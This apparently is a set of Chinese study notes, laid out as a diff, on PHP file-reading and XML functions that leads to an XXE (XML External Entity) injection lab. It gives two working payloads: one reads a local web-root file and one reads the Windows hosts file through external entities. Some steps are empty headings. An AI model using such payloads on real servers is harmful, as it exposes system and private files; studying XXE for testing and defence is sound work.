@@ -1,0 +1,51 @@
+1、File_get_contents()
+file_get_contents() 函数把整个文件读入一个字符串中。
+和 file() 一样，不同的是 file_get_contents() 把文件读入一个字符串。
+file_get_contents() 函数是用于将文件的内容读入到一个字符串中的首选方法。如果操作系统支持，还会使用内存映射技术来增强性能。
+语法：
+file_get_contents(path,include_path,context,start,max_length)
+
+例子
+<?php
+echo file_get_contents("test.txt");
+?>
+输出：
+This is a test file with test text.
+file_get_contents.php与test.txt在同一目录下：
+
+2、php://input
+php://input是一个可以访问请求的原始数据的只读流。
+结合file_get_contents(“php://input”)可以读取post提交的数据，不提交post数据则无输出。
+
+
+3、simplexml_load string函数介绍
+php中的simplexml_load_string函数将xml格式字符串转换为对应的simeplXMLElemlent\
+语法：
+simplexml_load_string(data,classname,options,ns,is_prefix);
+
+实例：
+4、XML注入回显，PHP输出函数
+在php中可以使用print_r()、echo输出想输出的内容。
+语法：
+bool print_r ( mixed $expression [, bool $return ] )
+参数说明：
+$expression: 要打印的变量，如果给出的是 string、integer 或 float 类型变量，将打印变量值本身。如果给出的是 array，将会按照一定格式显示键和元素。object 与数组类似。
+$return: 可选，如果为 true 则不输出结果，而是将结果赋值给一个变量，false 则直接输出结果。
+（1）服务端源代码：
+（2）提交正常参数
+（3）构造payload：
+.<?xml version="1.0"?>
+.<!DOCTYPE ANY [
+.	<!ENTITY content SYSTEM "file:///D:/phpstudy_pro/WWW/test.txt">
+.]>
+<note>
+<name>&content;</name>
+</note>
+（4）利用payload读取文件test.txt
+案例：
+<?xml version="1.0"?>
+<!DOCTYPE test [
+     <!ENTITY ddd SYSTEM "file:///c:/Windows/System32/drivers/etc/hosts">
+]>
+
+<test>&ddd;</test>
